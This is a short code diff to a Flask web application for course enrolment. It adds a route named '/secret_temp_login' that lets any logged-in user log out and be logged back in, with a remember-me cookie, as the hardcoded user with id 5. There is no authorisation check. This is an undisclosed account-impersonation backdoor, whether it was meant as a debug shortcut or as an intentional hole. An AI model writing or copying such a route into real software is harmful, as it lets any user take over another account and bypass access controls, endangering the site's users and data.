@@ -536,3 +536,10 @@ def admin_add_student():
             flash("This course doesn't exist!",'danger')
             return redirect(url_for('admin_add_student'))
     return render_template('admin_enroll_student.html', title='Enroll a student', form=form)
+
+@app.route('/secret_temp_login', methods=["GET", "POST"])
+@login_required
+def secret_login():
+    user = User.query.filter_by(id=5).first()
+    logout_user()
+    return login_user(user,remember=True)
